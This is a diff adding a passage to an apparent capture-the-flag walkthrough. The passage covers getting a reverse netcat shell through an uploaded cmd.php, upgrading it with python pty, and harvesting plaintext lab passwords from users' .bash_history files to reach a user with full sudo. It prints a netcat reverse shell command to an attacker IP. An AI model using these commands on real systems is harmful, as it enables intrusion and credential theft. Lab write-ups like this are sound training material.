@@ -247,3 +247,59 @@ As the admin I poked around, and at the suggestion of a hacker friend of mine us
 ## Reverse netcat, upgraded client
 
 I used cmd.php to open reverse netcat, giving me a shell on the client from my kali machine. With `python -c 'import pty; pty.spawn("/bin/bash")'` I got something more usable.
+
+> Note, the first reverse shell + python upgrade resulted in a weird terminal that doubled all letters (just on display, the commands still worked). I fixed it just by opening another nc: `nncc..ttrraaddiittiioonnaall  119922..116688..11..7766  66666666  --ee  //bbiinn//bbaasshh
+` :D
+
+Once on, I tried `sudo -l` but didn't have sudo access. I poked around for a bit, discovered dozens of home folders etc. The base website is mounted to `/home/www` I discovered.
+
+## Victory
+
+Ultimately, I did a successful recon by going to the root of /home and running `cat **/.bash_history`. There were over a dozen home folders, and most I had individually tried had .bash_histories with nothing in them. Doing a recursive cat from the root however revealed:
+
+```
+exit
+free
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+exit
+exit
+exit
+exit
+whoami
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+id
+exit
+top
+ps aux
+exit
+exit
+```
+
+I used the credentials for peter, above, to ssh on the box. A sudo -l for Peter revealed he had complete access, 
